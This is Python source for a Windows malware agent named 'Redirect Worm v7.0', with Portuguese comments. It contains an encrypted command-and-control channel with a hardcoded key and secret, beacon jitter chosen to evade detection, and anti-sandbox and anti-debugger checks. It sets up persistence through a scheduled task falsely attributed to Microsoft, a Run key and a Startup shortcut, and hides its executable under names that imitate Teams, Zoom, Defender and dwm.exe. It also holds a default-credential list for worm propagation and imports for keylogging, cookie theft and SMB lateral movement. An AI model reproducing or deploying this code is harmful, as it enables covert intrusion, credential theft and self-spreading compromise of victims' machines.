import os
import sqlite3
import json
import sys
import winreg
import base64
import shutil
import time
import platform
import socket
import uuid
import numpy
import string
import subprocess
import random
import importlib
import ctypes
import threading
import tempfile
import ftplib
import ipaddress
import hmac
import hashlib
from datetime import datetime
from urllib.parse import urljoin
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from ctypes import wintypes, windll, c_char_p, c_void_p, c_size_t, byref, create_string_buffer

# --- Dependências de terceiros — protegidas para diagnóstico preciso.
# Cada try/except independente isola o módulo problemático no CANARY_0_LOADER_FAIL.txt.
try:
    import requests
except ImportError:
    requests = None

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    import psutil
except ImportError:
    psutil = None

try:
    import browser_cookie3
except ImportError:
    browser_cookie3 = None

# Cryptodome — opcional; usado em features secundárias (browser cookies, file crypto).
# O protocolo C2 principal usa cryptography.hazmat (já bundled via Fernet do loader).
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Random import get_random_bytes
    _CRYPTO_OK = True
except ImportError:
    AES = None
    get_random_bytes = None
    _CRYPTO_OK = False

# cryptography.hazmat — bundled garantido (Fernet depende dele).
# Usado para encrypt_data / decrypt_data (protocolo AES-256-GCM com o C2).
try:
    from cryptography.hazmat.primitives.ciphers import Cipher as _HCipher, algorithms as _HAlgo, modes as _HModes
    from cryptography.hazmat.backends import default_backend as _hbackend
    _HAZMAT_OK = True
except ImportError:
    _HCipher = _HAlgo = _HModes = _hbackend = None
    _HAZMAT_OK = False

try:
    import pythoncom
    import win32com.client
    _WIN32COM_OK = True
except ImportError:
    pythoncom = None
    win32com = None
    _WIN32COM_OK = False

try:
    import cv2
except ImportError:
    cv2 = None
try:
    from win32 import win32crypt
except ImportError:
    win32crypt = None
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import pad, unpad
    from Cryptodome.Random import get_random_bytes
except ImportError:
    AES = None
try:
    from pynput.keyboard import Key, Listener
except ImportError:
    Listener = None

try:
    from impacket import smb, version
    from impacket.examples.services import rpcsvc, scmr
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport
    from impacket.dcerpc.v5 import scmr as dcerpc_scmr
    import ntpath
except ImportError:
    # Este bloco garante que o script não quebre se a impacket não estiver instalada
    # no ambiente de desenvolvimento, mas o compilador ainda verá as importações.
    pass

AGENT_VERSION = "Redirect Worm v7.0 build"
SERVER_URL = "%%C2_SERVER_URL%%"
AGENT_ID = None

# Nome real da chave de registro ou tarefa agendada criada na instalação.
_PERSIST_REG_NAME: str = ""

# Diretório de trabalho atual da shell remota.
_SHELL_CWD: str = ""

# Fila offline: resultados a enviar quando o C2 estava inacessível.
# Salvo criptografado em disco; reenviado no próximo beacon bem-sucedido.
_OFFLINE_QUEUE_PATH: str = ""   # definido em initialize_globals()

# URLs de fallback do C2 — tentadas em ordem se SERVER_URL falhar.
# Preenchido em initialize_globals() via placeholder %%C2_FALLBACK_URLS%%.
C2_FALLBACK_URLS: list = []

# Contratos de transporte: somente falhas transitórias podem trocar de endpoint
# ou entrar na fila. Erros permanentes não devem gerar retries infinitos.
TRANSIENT_HTTP_STATUSES = {408, 425, 429, 500, 502, 503, 504}
PERMANENT_HTTP_STATUSES = {400, 401, 403, 404, 409, 413}
HTTP_CONNECT_TIMEOUT_SECONDS = 5
HTTP_READ_TIMEOUT_SECONDS = 20
OFFLINE_QUEUE_MAX_ENTRIES = 200
OFFLINE_QUEUE_MAX_BYTES = 2 * 1024 * 1024
OFFLINE_QUEUE_REPLAY_BATCH = 20
OFFLINE_QUEUE_VERSION = 1
MAX_ACTIVE_TASKS = 4
_OFFLINE_QUEUE_LOCK = threading.Lock()

# --- BEACON TIMING ---
# BEACON_INTERVAL: intervalo base em segundos entre checkins.
# BEACON_JITTER:   fator de variacao (0.0 a 1.0). 0.3 = +/-30% do intervalo base.
# Exemplo: interval=10, jitter=0.3 -> cada sleep varia entre 7s e 13s.
# OPSEC: jitter dificulta deteccao por analise de timing de trafego de rede (T1071).
BEACON_INTERVAL = 10
BEACON_JITTER   = 0.3


def _beacon_sleep():
    """Dorme por BEACON_INTERVAL +/- BEACON_JITTER * BEACON_INTERVAL segundos."""
    deviation = BEACON_INTERVAL * BEACON_JITTER
    duration  = BEACON_INTERVAL + random.uniform(-deviation, deviation)
    if duration < 1.0:
        duration = 1.0
    time.sleep(duration)



# --- VARIÁVEIS GLOBAIS (Inicialmente vazias) ---
# Declaramos as variáveis que usaremos, mas não as inicializamos ainda.
C2_AES_KEY = None
HTTP_HEADERS = {}
PLAUSIBLE_INSTALL_LOCATIONS = []
PLAUSIBLE_REG_KEYS = []


def initialize_globals():
    """
    Inicializa as variáveis globais. O token agora é removido dos headers.
    """
    global C2_AES_KEY, HTTP_HEADERS

    # --- Inicialização da Chave AES (sem alterações) ---
    c2_aes_key_b64 = "zqCadix1Ar6CySmLooKfkoOZ7ype1q46IO0UyVlZo70="
    try:
        C2_AES_KEY = base64.b64decode(c2_aes_key_b64)
        if len(C2_AES_KEY) != 32:
            raise ValueError("Chave AES inválida.")
    except Exception as e:
        print(f"[CRÍTICO] A chave AES é inválida: {e}.")
        C2_AES_KEY = get_random_bytes(32)

    # --- INÍCIO DA MUDANÇA ---
    # Removemos o 'X-Gemini-Token' e o 'agent_shared_secret' daqui.
    # O único header padrão agora é o User-Agent.
    fake_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
    HTTP_HEADERS.update({
        'User-Agent': fake_user_agent
    })
    # Header secreto para o redirector Cloudflare Worker.
    # Vazio = sem redirector (acesso direto ao C2).
    # Preenchido pelo Builder via placeholder %%CDN_TOKEN%%.
    _cdn_token = "%%CDN_TOKEN%%"
    if _cdn_token and not _cdn_token.startswith("%%"):
        HTTP_HEADERS['X-Cdn-Token'] = _cdn_token

    # --- Fila offline ---
    global _OFFLINE_QUEUE_PATH
    _q_dir = os.environ.get('TEMP') or tempfile.gettempdir()
    _OFFLINE_QUEUE_PATH = os.path.join(_q_dir, ".ms_upd_q")

    # --- Fallback C2 URLs ---
    _fallback_raw = "%%C2_FALLBACK_URLS%%"
    if _fallback_raw and not _fallback_raw.startswith("%%"):
        C2_FALLBACK_URLS.extend(
            [u.strip() for u in _fallback_raw.split(",") if u.strip()]
        )

    # --- Inicialização das Listas de Persistência ---
    PLAUSIBLE_INSTALL_LOCATIONS.extend([
        {"dir": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Teams'), "name": "TeamsUpdater.exe"},
        {"dir": os.path.join(os.environ.get('APPDATA', ''), 'Zoom', 'bin'), "name": "zUpdater.exe"},
        {"dir": os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox'), "name": "mozMaintenance.exe"},
        {"dir": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Discord', 'app-1.0.9006'), "name": "DiscordUpdate.exe"},
        {"dir": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'CrashReports'), "name": "reporter.exe"}
    ])
    PLAUSIBLE_REG_KEYS.extend([
        "Microsoft Teams Update",
        "Adobe Acrobat Update Task",
        "Google Crash Reporter",
        "NVIDIA Driver Helper Service",
        "Realtek Audio Manager",
        "Mozilla Maintenance Service",
        "AMD Driver",
        "NVIDIA DRIVER"
    ])



DEFAULT_CREDENTIALS = [
    ("root",     "root"),
    ("root",     ""),
    ("root",     "toor"),
    ("root",     "1234"),
    ("root",     "admin"),
    ("root",     "password"),
    ("root",     "123456"),
    ("admin",    "admin"),
    ("admin",    ""),
    ("admin",    "1234"),
    ("admin",    "password"),
    ("admin",    "admin123"),
    ("user",     "user"),
    ("user",     "1234"),
    ("pi",       "raspberry"),
    ("pi",       "pi"),
    ("ubuntu",   "ubuntu"),
    ("ubuntu",   ""),
    ("oracle",   "oracle"),
    ("postgres", "postgres"),
    ("ftp",      "ftp"),
    ("ftp",      ""),
    ("anonymous",""),
    ("guest",    "guest"),
    ("guest",    ""),
    ("test",     "test"),
    ("support",  "support"),
    ("service",  "service"),
    ("nagios",   "nagios"),
    ("operator", "operator"),
]

# --- CONTROLE DE CONCORRÊNCIA DO WORM ---
# Limita threads simultâneas para evitar OOM em CIDRs grandes.
# _WORM_SCAN_SEM: quantos IPs são scaneados ao mesmo tempo.
# _WORM_EXPLOIT_SEM: quantos exploits rodam em paralelo.
_WORM_SCAN_SEM    = threading.Semaphore(30)
_WORM_EXPLOIT_SEM = threading.Semaphore(15)



# --- LOGGING INTERNO ---
# Log gravado localmente para debug. Em producao o arquivo nao e sincronizado
# com o C2 -- serve apenas para diagnostico local do operador no host alvo.
def write_internal_log(message):
    try:
        # Caminho absoluto baseado no script/executável, independente do CWD.
        # Fundamental para processos elevados via COM (CWD inicial = System32).
        if getattr(sys, 'frozen', False):
            _base = os.path.dirname(sys.executable)
        else:
            _base = os.path.dirname(os.path.abspath(__file__))
        _log_path = os.path.join(_base, "agent_internal_log.txt")
        with open(_log_path, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
    except Exception:
        pass  # nunca crasha o agente por falha de log
# --- Função de Criptografia --- #
def encrypt_data(plaintext_data: str, key: bytes) -> str:
    """Criptografa dados (str) usando AES-256-GCM e retorna Base64 (str).
    Wire format: header(14) + nonce(16) + tag(16) + ciphertext
    Usa cryptography.hazmat (sempre bundled via Fernet) em vez de Cryptodome.
    """
    try:
        header = b"GEMINI_C2_DATA"
        nonce  = os.urandom(16)
        enc    = _HCipher(_HAlgo.AES(key), _HModes.GCM(nonce), backend=_hbackend()).encryptor()
        ciphertext = enc.update(plaintext_data.encode('utf-8')) + enc.finalize()
        tag        = enc.tag  # 16 bytes GCM tag
        return base64.b64encode(header + nonce + tag + ciphertext).decode('utf-8')
    except Exception as e:
        try:
            write_internal_log(f"Erro ao criptografar: {e}")
        except NameError:
            print(f"[ERRO] Erro ao criptografar: {e}")
        return ""

def decrypt_data(base64_data: bytes, key: bytes) -> str:
    """Decriptografa Base64 (bytes) usando AES-256-GCM e retorna (str).
    Wire format: header(14) + nonce(16) + tag(16) + ciphertext
    """
    try:
        raw = base64.b64decode(base64_data)
        if not raw.startswith(b"GEMINI_C2_DATA"):
            raise ValueError("Payload inválido ou corrompido (header incorreto)")
        HL, NL, TL = 14, 16, 16
        nonce      = raw[HL      : HL + NL]
        tag        = raw[HL + NL : HL + NL + TL]
        ciphertext = raw[HL + NL + TL :]
        dec = _HCipher(_HAlgo.AES(key), _HModes.GCM(nonce, tag), backend=_hbackend()).decryptor()
        return (dec.update(ciphertext) + dec.finalize()).decode('utf-8')
    except Exception as e:
        try:
            write_internal_log(f"Erro ao decriptografar: {e}")
        except NameError:
            print(f"[ERRO] Erro ao decriptografar: {e}")
        return ""

# Em agent.py

# ### ADICIONE ESTA NOVA FUNÇÃO COMPLETA ###
def get_authenticated_headers(payload_bytes=b''):
    """
    Cria os headers para uma requisição, incluindo um HMAC para autenticação.
    """
    # Segredo HMAC compartilhado -- deve bater com AGENT_SHARED_SECRET no .env do servidor
    agent_shared_secret_bytes = b"mariaeuteamo"
    
    # Pega o tempo atual como uma string (ex: "1672531200")
    timestamp = str(int(time.time()))
    
    # Cria a "mensagem" a ser assinada: o timestamp + o corpo da requisição
    message_to_sign = timestamp.encode('utf-8') + payload_bytes
    
    # Gera a assinatura HMAC-SHA256 da mensagem
    signature = hmac.new(agent_shared_secret_bytes, message_to_sign, hashlib.sha256).hexdigest()
    
    # Copia os headers base (como o User-Agent)
    auth_headers = HTTP_HEADERS.copy()
    
    # Adiciona os novos headers de autenticação
    auth_headers['X-Request-Timestamp'] = timestamp
    auth_headers['X-Signature'] = signature
    
    return auth_headers



# --- FUNÇÕES DE EVASÃO ---
def anti_analysis_checks():
    """
    Verifica múltiplos indicadores de ambiente de análise/sandbox antes de operar.
    Retorna True se o ambiente for suspeito (agente deve dormir ou sair).
    Técnicas: T1497.001 (virtualização), T1497.002 (usuário), T1497.003 (timing).
    """
    write_internal_log("Iniciando checagens anti-análise.")

    # --- 1. Username suspeito (T1497.002) ---
    suspicious_usernames = {
        "sandbox", "test", "vagrant", "tester", "maltest", "malware",
        "virus", "av", "admin", "administrator", "analysis", "analyst",
        "user", "john", "john doe", "sample", "anything", "currentuser",
    }
    try:
        import getpass
        login = getpass.getuser().lower()
    except Exception:
        login = ""
    if login in suspicious_usernames:
        write_internal_log(f"Evasão: username suspeito '{login}'.")
        return True

    # --- 2. Hostname suspeito ---
    suspicious_hostnames = (
        "sandbox", "malware", "virus", "av-", "analysis", "analyst",
        "win7", "win-", "desktop-win", "desktop-analysis", "cuckoo",
        "john-pc", "test-pc", "sample",
    )
    try:
        hn = socket.gethostname().lower()
        if any(s in hn for s in suspicious_hostnames):
            write_internal_log(f"Evasão: hostname suspeito '{hn}'.")
            return True
    except Exception:
        pass

    # --- 3. CPU count baixo (T1497.001) ---
    if psutil and psutil.cpu_count(logical=False) is not None:
        if psutil.cpu_count(logical=False) < 2:
            write_internal_log(f"Evasão: apenas {psutil.cpu_count(logical=False)} núcleo(s) físico(s).")
            return True

    # --- 4. RAM baixa (< 3 GB — VMs de sandbox geralmente têm 1-2 GB) ---
    if psutil:
        try:
            ram_gb = psutil.virtual_memory().total / (1024 ** 3)
            if ram_gb < 3.0:
                write_internal_log(f"Evasão: RAM insuficiente ({ram_gb:.1f} GB).")
                return True
        except Exception:
            pass

    # --- 5. Disco pequeno (< 60 GB) ---
    if psutil:
        try:
            disk_gb = psutil.disk_usage(os.path.abspath(os.sep)).total / (1024 ** 3)
            if disk_gb < 60.0:
                write_internal_log(f"Evasão: disco pequeno ({disk_gb:.0f} GB).")
                return True
        except Exception:
            pass

    # --- 6. Uptime baixo < 5 minutos (T1497.003 — sandbox reinicia frequentemente) ---
    if platform.system() == "Windows":
        try:
            uptime_ms = ctypes.windll.kernel32.GetTickCount64()
            if uptime_ms < 5 * 60 * 1000:
                write_internal_log(f"Evasão: uptime muito baixo ({uptime_ms // 1000}s).")
                return True
        except Exception:
            pass

    # --- 7. Resolução de tela suspeita (sandboxes usam 800×600 ou 1024×768) ---
    if platform.system() == "Windows":
        try:
            w = ctypes.windll.user32.GetSystemMetrics(0)  # SM_CXSCREEN
            h = ctypes.windll.user32.GetSystemMetrics(1)  # SM_CYSCREEN
            if (w, h) in ((800, 600), (1024, 768), (640, 480)):
                write_internal_log(f"Evasão: resolução suspeita ({w}x{h}).")
                return True
        except Exception:
            pass

    # --- 8. MAC address com vendor de VM (T1497.001) ---
    VM_MAC_PREFIXES = (
        "00:0c:29",  # VMware
        "00:50:56",  # VMware
        "08:00:27",  # VirtualBox
        "52:54:00",  # QEMU/KVM
        "00:1c:14",  # VMware
        "00:05:69",  # VMware
        "00:16:3e",  # Xen
    )
    if psutil:
        try:
            for iface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK if hasattr(psutil, 'AF_LINK') else -1:
                        mac = addr.address.lower()
                        if any(mac.startswith(p) for p in VM_MAC_PREFIXES):
                            write_internal_log(f"Evasão: MAC de VM detectado ({mac}).")
                            return True
        except Exception:
            pass

    # --- 9. Strings de VM no BIOS/hardware via WMI ---
    VM_STRINGS = ("vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "hyper-v", "microsoft corporation")
    if platform.system() == "Windows" and _WIN32COM_OK:
        try:
            wmi = win32com.client.GetObject("winmgmts:")
            for item in wmi.InstancesOf("Win32_ComputerSystem"):
                model = (item.Manufacturer or "" + " " + item.Model or "").lower()
                if any(s in model for s in VM_STRINGS):
                    write_internal_log(f"Evasão: hardware VM detectado ('{model}').")
                    return True
            for item in wmi.InstancesOf("Win32_BIOS"):
                bios = (item.Manufacturer or "" + " " + item.Version or "").lower()
                if any(s in bios for s in VM_STRINGS):
                    write_internal_log(f"Evasão: BIOS VM detectado ('{bios}').")
                    return True
        except Exception:
            pass

    # --- 10. Processos de análise (lista expandida) ---
    ANALYSIS_PROCS = {
        "wireshark.exe", "procmon.exe", "procmon64.exe", "fiddler.exe",
        "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "windbg.exe",
        "ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe",
        "dnspy.exe", "dnspy64.exe", "de4dot.exe",
        "pe-bear.exe", "pestudio.exe", "cff explorer.exe",
        "regshot.exe", "autoruns.exe", "autorunsc.exe",
        "sysmon.exe", "sysmon64.exe",
        "processhacker.exe", "tcpview.exe", "filemon.exe",
        "vmtoolsd.exe", "vmsrvc.exe", "vboxservice.exe", "vboxtray.exe",
        "sandboxiedcomlaunch.exe", "sbiesvc.exe",
    }
    if psutil:
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() in ANALYSIS_PROCS:
                    write_internal_log(f"Evasão: processo de análise '{proc.info['name']}' detectado.")
                    return True
        except Exception:
            pass

    write_internal_log("Anti-análise: nenhum indicador detectado.")
    return False



def create_scheduled_task_api(task_name, executable_path):
    """
    Cria uma Tarefa Agendada para persistência usando a API COM, sem chamar schtasks.exe.
    Retorna True se for bem-sucedido, False caso contrário.
    """
    if not _WIN32COM_OK:
        write_internal_log("create_scheduled_task_api: pythoncom/win32com indisponível, pulando.")
        return False
    try:
        pythoncom.CoInitialize() # Inicializa o COM para este thread
        scheduler = win32com.client.Dispatch('Schedule.Service')
        scheduler.Connect()

        root_folder = scheduler.GetFolder('\\')
        task_def = scheduler.NewTask(0)

        # Gatilho: Executar no logon de qualquer usuário
        trigger = task_def.Triggers.Create(9) # 9 = On Logon
        trigger.Id = "LogonTriggerId"
        trigger.Enabled = True

        # Ação: Executar o programa
        action = task_def.Actions.Create(0) # 0 = Execute
        action.Path = executable_path
        
        # Configurações da tarefa
        task_def.RegistrationInfo.Description = 'Mantém componentes críticos do sistema atualizados.'
        task_def.RegistrationInfo.Author = 'Microsoft Corporation' # Exemplo de disfarce
        task_def.Settings.Enabled = True
        task_def.Settings.StopIfGoingOnBatteries = False
        task_def.Settings.DisallowStartIfOnBatteries = False

        # Tenta remover uma tarefa existente com o mesmo nome antes de criar
        try:
            root_folder.DeleteTask(task_name, 0)
        except:
            pass # Ignora o erro se a tarefa não existir

        # Registra a tarefa. O 6 significa "Create or Update" com credenciais do usuário atual.
        root_folder.RegisterTaskDefinition(
            task_name,
            task_def,
            6, 
            '', # User ID (vazio para usuário atual)
            '', # Password (vazio)
            3  # Logon Type: Interactive
        )
        
        write_internal_log(f"Persistência via API de Tarefa Agendada '{task_name}' criada com sucesso.")
        pythoncom.CoUninitialize()
        return True
    except Exception as e:
        write_internal_log(f"Exceção ao criar Tarefa Agendada via API: {e}")
        try:
            pythoncom.CoUninitialize()
        except Exception:
            pass
        return False


def create_registry_key_api(key_name, executable_path):
    """
    Cria uma chave de registro para persistência usando a API winreg.
    """
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        # Abre a chave-mãe. Se não existir, ela será criada.
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        # Define o valor. Isso cria ou substitui a entrada de persistência.
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
        winreg.CloseKey(key)
        write_internal_log(f"Persistência via API de Chave de Registro '{key_name}' criada com sucesso.")
        return True
    except Exception as e:
        write_internal_log(f"Falha ao criar Chave de Registro via API: {e}")
        return False


def is_admin():
    """Verifica se o agente está rodando com privilégios de administrador."""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        # Se a importação ou a chamada falhar, assume que não é admin.
        return False

# --- Listas de Locais de Instalação por Nível de Privilégio ---

# Nomes de aplicativos falsos para preencher os padrões
APP_NAMES = ["Microsoft", "Google", "Mozilla", "Nvidia", "Realtek", "System", "Intel", "Adobe"]

# Nível 1: Locais que NÃO precisam de privilégios de admin
LOW_PRIV_LOCATIONS = [
    {"dir": os.environ.get('PUBLIC') + r'\Documents', "name_pattern": "{app}Installer.exe", "reg_name": "{app} Installer"},
    {"dir": os.environ.get('LOCALAPPDATA') + r'\Microsoft\Edge\User Data', "name_pattern": "bcastd_vr.exe", "reg_name": "BrowserCast VR Service"},
    {"dir": os.environ.get('LOCALAPPDATA') + r'\Google\Chrome\User Data\Default\Extensions', "name_pattern": "crx_update.exe", "reg_name": "Chrome Extension Updater"},
    {"dir": os.environ.get('LOCALAPPDATA') + r'\Discord\app-1.0.9005\modules', "name_pattern": "module_updater.exe", "reg_name": "Discord Module Updater"},
    {"dir": os.environ.get('APPDATA') + r'\Zoom\bin', "name_pattern": "zUpdater.exe", "reg_name": "Zoom Updater Service"},
]

# Nível 2: Locais que PRECISAM de privilégios de admin
HIGH_PRIV_LOCATIONS = [
    {"dir": os.environ.get('ProgramFiles') + r'\Common Files\System', "name_pattern": "sysdiag.exe", "reg_name": "System Diagnostics Service"},
    {"dir": os.environ.get('ProgramFiles') + r'\Windows Defender', "name_pattern": "MpSigStub.exe", "reg_name": "Microsoft Protection Signature Stub"},
    {"dir": os.environ.get('SystemRoot') + r'\System32', "name_pattern": "dwn.exe", "reg_name": "Desktop Window Manager Service"}, # Parecido com o legítimo dwm.exe
    {"dir": os.environ.get('SystemRoot') + r'\System32\drivers', "name_pattern": "audiodg.sys", "reg_name": "Windows Audio Device Graph Driver"}, # .sys para parecer um driver
]

def generate_advanced_install_path():
    """
    Gera um local de instalação com base no nível de privilégio do processo.
    Versão robusta para lidar com variáveis de ambiente ausentes.
    """
    location_pool = []
    
    # --- INÍCIO DA CORREÇÃO ---
    
    # Função auxiliar para validar e expandir caminhos
    def get_valid_locations(locations_list):
        valid_locations = []
        for loc in locations_list:
            try:
                # Usa expandvars para substituir %VAR% pelo caminho real
                expanded_dir = os.path.expandvars(loc["dir"])
                # Adiciona à lista apenas se a expansão funcionou e o caminho não contém mais '%'
                if '%' not in expanded_dir:
                    # Armazena o caminho já expandido para não precisar fazer de novo
                    loc["expanded_dir"] = expanded_dir
                    valid_locations.append(loc)
            except Exception:
                # Ignora qualquer erro durante a expansão do caminho
                continue
        return valid_locations

    # Popula a lista de locais com base nos privilégios
    if is_admin():
        write_internal_log("Privilégios de administrador detectados. Considerando locais de sistema.")
        location_pool.extend(get_valid_locations(LOW_PRIV_LOCATIONS))
        location_pool.extend(get_valid_locations(HIGH_PRIV_LOCATIONS))
    else:
        write_internal_log("Executando com privilégios de usuário padrão. Usando apenas locais de baixo privilégio.")
        location_pool = get_valid_locations(LOW_PRIV_LOCATIONS)

    # Fallback de emergência se, mesmo após a validação, a lista estiver vazia
    if not location_pool:
        write_internal_log("AVISO: Nenhum local de instalação válido encontrado. Usando fallback de emergência.")
        fallback_dir = os.path.expandvars(r'%APPDATA%\SystemFramework')
        return {
            "path": os.path.join(fallback_dir, "framework.exe"),
            "dir": fallback_dir,
            "name": "framework.exe",
            "reg_name": "System Framework Service"
        }
        
    # --- FIM DA CORREÇÃO ---

    chosen_location = random.choice(location_pool)
    
    app_name = random.choice(APP_NAMES)
    # Usa o caminho já expandido e validado
    install_dir = chosen_location["expanded_dir"] 
    executable_name = chosen_location["name_pattern"].format(app=app_name)
    reg_name = chosen_location["reg_name"].format(app=app_name)
    
    full_path = os.path.join(install_dir, executable_name)

    return {
        "path": full_path,
        "dir": install_dir,
        "name": executable_name,
        "reg_name": reg_name
    }


def _create_startup_lnk(name: str, target_path: str) -> bool:
    """
    Cria um atalho (.lnk) na pasta Startup do usuário para persistência redundante.
    Funciona mesmo se a chave de registro for removida por AV.
    Requer win32com (pywin32); silencia qualquer erro sem interromper a instalação.
    """
    if not _WIN32COM_OK:
        return False
    try:
        startup_dir = os.path.join(
            os.environ.get('APPDATA', ''),
            r'Microsoft\Windows\Start Menu\Programs\Startup'
        )
        lnk_path = os.path.join(startup_dir, f"{name}.lnk")
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(lnk_path)
        shortcut.Targetpath = target_path
        shortcut.WorkingDirectory = os.path.dirname(target_path)
        shortcut.Description = name
        shortcut.save()
        write_internal_log(f"Persistência LNK criada: {lnk_path}")
        return True
    except Exception as e:
        write_internal_log(f"Falha ao criar LNK Startup: {e}")
        return False


def _remove_startup_lnk(name: str) -> None:
    """Remove o atalho de Startup criado por _create_startup_lnk."""
    try:
        startup_dir = os.path.join(
            os.environ.get('APPDATA', ''),
            r'Microsoft\Windows\Start Menu\Programs\Startup'
        )
        lnk_path = os.path.join(startup_dir, f"{name}.lnk")
        if os.path.exists(lnk_path):
            os.remove(lnk_path)
            write_internal_log(f"LNK Startup removido: {lnk_path}")
    except Exception as e:
        write_internal_log(f"Falha ao remover LNK Startup: {e}")


# ---------------------------------------------------------------------------
# Offline task queue — resultados enfileirados quando o C2 está inacessível
# ---------------------------------------------------------------------------

def _response_disposition(status_code: int) -> str:
    if status_code == 200:
        return "success"
    if status_code in TRANSIENT_HTTP_STATUSES:
        return "transient"
    return "permanent"


def _queue_decode_line(line: str):
    decrypted = decrypt_data(line.encode("utf-8"), C2_AES_KEY)
    if not decrypted:
        return None
    entry = json.loads(decrypted)
    return entry if isinstance(entry, dict) else None


def _queue_encode_entry(entry: dict):
    encoded = encrypt_data(json.dumps(entry, ensure_ascii=False), C2_AES_KEY)
    return encoded if encoded else None


def _queue_read_bounded() -> list:
    """Lê a cauda válida da fila sem permitir uso de memória sem limite."""
    if not os.path.exists(_OFFLINE_QUEUE_PATH):
        return []
    retained = []
    retained_bytes = 0
    with open(_OFFLINE_QUEUE_PATH, "r", encoding="utf-8") as fh:
        for raw_line in fh:
            line = raw_line.strip()
            line_bytes = len(line.encode("utf-8")) + 1
            if not line or line_bytes > OFFLINE_QUEUE_MAX_BYTES:
                continue
            retained.append(line)
            retained_bytes += line_bytes
            while (
                len(retained) > OFFLINE_QUEUE_MAX_ENTRIES
                or retained_bytes > OFFLINE_QUEUE_MAX_BYTES
            ):
                retained_bytes -= len(retained.pop(0).encode("utf-8")) + 1
    return retained


def _queue_write_atomic(lines: list) -> None:
    queue_dir = os.path.dirname(_OFFLINE_QUEUE_PATH) or "."
    os.makedirs(queue_dir, exist_ok=True)
    temp_path = _OFFLINE_QUEUE_PATH + ".tmp"
    with open(temp_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + ("\n" if lines else ""))
        fh.flush()
        os.fsync(fh.fileno())
    os.replace(temp_path, _OFFLINE_QUEUE_PATH)


def _queue_push(task_id: str, result_data, data_type: str) -> bool:
    """Persiste um resultado de forma limitada, deduplicada e atômica."""
    if not _OFFLINE_QUEUE_PATH or not C2_AES_KEY or not AGENT_ID or not task_id:
        return False
    try:
        with _OFFLINE_QUEUE_LOCK:
            existing = []
            if os.path.exists(_OFFLINE_QUEUE_PATH):
                existing = _queue_read_bounded()

            entry = {
                "version": OFFLINE_QUEUE_VERSION,
                "origin_agent_id": AGENT_ID,
                "task_id": task_id,
                "result": result_data,
                "data_type": data_type,
                "attempts": 0,
                "created_at": datetime.now().isoformat(),
            }
            dedupe_key = (AGENT_ID, task_id, data_type)
            retained = []
            for line in existing:
                try:
                    old = _queue_decode_line(line)
                    old_key = (
                        old.get("origin_agent_id"), old.get("task_id"), old.get("data_type")
                    ) if old else None
                    if old_key == dedupe_key:
                        continue
                except Exception:
                    pass
                retained.append(line)

            encoded = _queue_encode_entry(entry)
            if not encoded:
                return False
            retained.append(encoded)
            retained = retained[-OFFLINE_QUEUE_MAX_ENTRIES:]
            while retained and len(("\n".join(retained) + "\n").encode("utf-8")) > OFFLINE_QUEUE_MAX_BYTES:
                retained.pop(0)
            _queue_write_atomic(retained)
            return encoded in retained
    except Exception as e:
        write_internal_log(f"[offline_queue] push error: {type(e).__name__}")
        return False


def _queue_replay() -> None:
    """
    Tenta reenviar todos os resultados pendentes na fila offline.
    Entradas enviadas com sucesso são removidas; falhas permanecem na fila.
    Chamado no início de cada ciclo de get_task quando o C2 está acessível.
    """
    if not _OFFLINE_QUEUE_PATH or not os.path.exists(_OFFLINE_QUEUE_PATH):
        return
    try:
        with _OFFLINE_QUEUE_LOCK:
            lines = _queue_read_bounded()
            if not lines:
                return
            remaining = []
            replayed = 0
            attempted = 0
            for line in lines:
                try:
                    entry = _queue_decode_line(line)
                    if (
                        not entry
                        or entry.get("version") != OFFLINE_QUEUE_VERSION
                        or entry.get("origin_agent_id") != AGENT_ID
                    ):
                        remaining.append(line)
                        continue
                    if attempted >= OFFLINE_QUEUE_REPLAY_BATCH:
                        remaining.append(line)
                        continue
                    attempted += 1
                    payload = json.dumps({
                        "agent_id": entry["origin_agent_id"],
                        "task_id": entry["task_id"],
                        "data_type": entry["data_type"],
                        "result": entry["result"],
                    })
                    enc = encrypt_data(payload, C2_AES_KEY)
                    if not enc:
                        remaining.append(line)
                        continue
                    body = enc.encode("utf-8")
                    resp = _http_post_with_fallback(
                        "/task_result", body, get_authenticated_headers(body)
                    )
                    disposition = _response_disposition(resp.status_code)
                    if disposition == "success":
                        ack = _decode_encrypted_json_response(resp, "queue_ack")
                        if ack and ack.get("status") == "success":
                            replayed += 1
                            continue
                    elif disposition == "permanent":
                        write_internal_log(
                            f"[offline_queue] discarded permanent status={resp.status_code}"
                        )
                        continue
                    entry["attempts"] = int(entry.get("attempts", 0)) + 1
                    updated = _queue_encode_entry(entry)
                    remaining.append(updated or line)
                except Exception:
                    remaining.append(line)
            _queue_write_atomic(remaining)
            if replayed:
                write_internal_log(f"[offline_queue] replayed={replayed}")
    except Exception as e:
        write_internal_log(f"[offline_queue] replay error: {e}")


# ---------------------------------------------------------------------------
# Fallback C2 URL — tenta SERVER_URL e depois C2_FALLBACK_URLS
# ---------------------------------------------------------------------------

